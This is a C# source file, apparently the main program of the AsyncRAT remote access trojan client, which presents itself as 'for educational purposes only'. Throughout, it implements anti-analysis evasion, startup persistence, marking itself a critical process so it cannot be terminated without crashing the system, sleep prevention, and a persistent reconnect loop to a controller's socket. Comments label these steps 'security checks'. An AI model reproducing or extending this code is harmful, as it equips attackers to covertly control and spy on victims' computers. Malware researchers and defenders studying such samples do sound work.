using System.Threading;
using Client.Connection;
using Client.Install;
using System;
using Client.Helper;
using System.Diagnostics;
using System.IO;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program is distributed for educational purposes only.
*/

namespace Client
{
    public class Program
    {
        private static readonly object _lockObject = new object();
        private static volatile bool _shouldExit = false;

        public static void Main()
        {
            try
            {
                // Set up global exception handling
                AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;

                // Initialize settings first
                if (!InitializeSettings())
                {
                    SafeExit(1);
                    return;
                }

                // Apply startup delay if configured
                ApplyStartupDelay();

                // Run security and installation checks
                if (!RunSecurityChecks())
                {
                    SafeExit(0);
                    return;
                }

                // Main connection loop
                RunMainLoop();
            }
            catch (Exception ex)
            {
                WriteToEventLog($"Critical error in main: {ex.Message}", EventLogEntryType.Error);
                SafeExit(1);
            }
        }

        private static bool InitializeSettings()
        {
            try
            {
                return Settings.InitializeSettings();
            }
            catch (Exception ex)
            {
                WriteToEventLog($"Failed to initialize settings: {ex.Message}", EventLogEntryType.Error);
                return false;
            }
        }

        private static void ApplyStartupDelay()
        {
            try
            {
                int delay = Convert.ToInt32(Settings.Delay);
                if (delay > 0)
                {
                    // Cap delay to reasonable maximum (5 minutes)
                    delay = Math.Min(delay, 300);
                    
                    for (int i = 0; i < delay && !_shouldExit; i++)
                    {
                        Thread.Sleep(1000);
                    }
                }
            }
            catch (Exception ex)
            {
                WriteToEventLog($"Error applying startup delay: {ex.Message}", EventLogEntryType.Warning);
                // Continue execution even if delay fails
            }
        }

        private static bool RunSecurityChecks()
        {
            try
            {
                // Check for duplicate instances
                if (!MutexControl.CreateMutex())
                {
                    WriteToEventLog("Duplicate instance detected, exiting", EventLogEntryType.Information);
                    return false;
                }

                // Run anti-analysis if enabled
                if (Convert.ToBoolean(Settings.Anti))
                {
                    try
                    {
                        Anti_Analysis.RunAntiAnalysis();
                    }
                    catch (Exception ex)
                    {
                        WriteToEventLog($"Anti-analysis check failed: {ex.Message}", EventLogEntryType.Warning);
                        // Continue execution even if anti-analysis fails
                    }
                }

                // Install persistence if enabled
                if (Convert.ToBoolean(Settings.Install))
                {
                    try
                    {
                        NormalStartup.Install();
                    }
                    catch (Exception ex)
                    {
                        WriteToEventLog($"Installation failed: {ex.Message}", EventLogEntryType.Warning);
                        // Continue execution even if installation fails
                    }
                }

                // Set critical process if enabled and admin
                if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
                {
                    try
                    {
                        ProcessCritical.Set();
                    }
                    catch (Exception ex)
                    {
                        WriteToEventLog($"Failed to set critical process: {ex.Message}", EventLogEntryType.Warning);
                        // Continue execution even if critical process setting fails
                    }
                }

                // Prevent system sleep
                try
                {
                    Methods.PreventSleep();
                }
                catch (Exception ex)
                {
                    WriteToEventLog($"Failed to prevent sleep: {ex.Message}", EventLogEntryType.Warning);
                    // Continue execution even if sleep prevention fails
                }

                return true;
            }
            catch (Exception ex)
            {
                WriteToEventLog($"Security checks failed: {ex.Message}", EventLogEntryType.Error);
                return false;
            }
        }

        private static void RunMainLoop()
        {
            int consecutiveFailures = 0;
            const int maxConsecutiveFailures = 10;
            const int baseRetryDelay = 5000; // 5 seconds

            while (!_shouldExit)
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        try
                        {
                            ClientSocket.Reconnect();
                            ClientSocket.InitializeClient();
                            
                            if (ClientSocket.IsConnected)
                            {
                                consecutiveFailures = 0; // Reset failure counter on successful connection
                            }
                        }
                        catch (Exception ex)
                        {
                            consecutiveFailures++;
                            WriteToEventLog($"Connection attempt {consecutiveFailures} failed: {ex.Message}", EventLogEntryType.Warning);
                            
                            // If too many consecutive failures, implement exponential backoff
                            if (consecutiveFailures >= maxConsecutiveFailures)
                            {
                                int backoffDelay = Math.Min(baseRetryDelay * (int)Math.Pow(2, Math.Min(consecutiveFailures - maxConsecutiveFailures, 5)), 300000); // Max 5 minutes
                                WriteToEventLog($"Too many consecutive failures, backing off for {backoffDelay}ms", EventLogEntryType.Information);
                                Thread.Sleep(backoffDelay);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    WriteToEventLog($"Error in main loop: {ex.Message}", EventLogEntryType.Error);
                    consecutiveFailures++;
                }

                // Standard retry delay
                if (!_shouldExit)
                {
                    Thread.Sleep(baseRetryDelay);
                }
            }
        }

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            try
            {
                var exception = e.ExceptionObject as Exception;
                WriteToEventLog($"Unhandled exception: {exception?.Message ?? "Unknown error"}", EventLogEntryType.Error);
                
                if (e.IsTerminating)
                {
                    Methods.ClientOnExit();
                }
            }
            catch
            {
                // Last resort - can't even log the error
            }
        }

        private static void WriteToEventLog(string message, EventLogEntryType entryType)
        {
            try
            {
                // Only log to event log in release mode and if we have permissions
#if !DEBUG
                if (Methods.IsAdmin())
                {
                    using (EventLog eventLog = new EventLog("Application"))
                    {
                        eventLog.Source = "AsyncRAT Client";
                        eventLog.WriteEntry(message, entryType);
                    }
                }
#endif
                // In debug mode or if no admin rights, write to debug output
                Debug.WriteLine($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [{entryType}] {message}");
            }
            catch
            {
                // Ignore logging errors to prevent cascading failures
            }
        }

        public static void RequestExit()
        {
            _shouldExit = true;
        }

        private static void SafeExit(int exitCode)
        {
            try
            {
                Methods.ClientOnExit();
            }
            catch (Exception ex)
            {
                WriteToEventLog($"Error during cleanup: {ex.Message}", EventLogEntryType.Warning);
            }
            finally
            {
                Environment.Exit(exitCode);
            }
        }
    }
}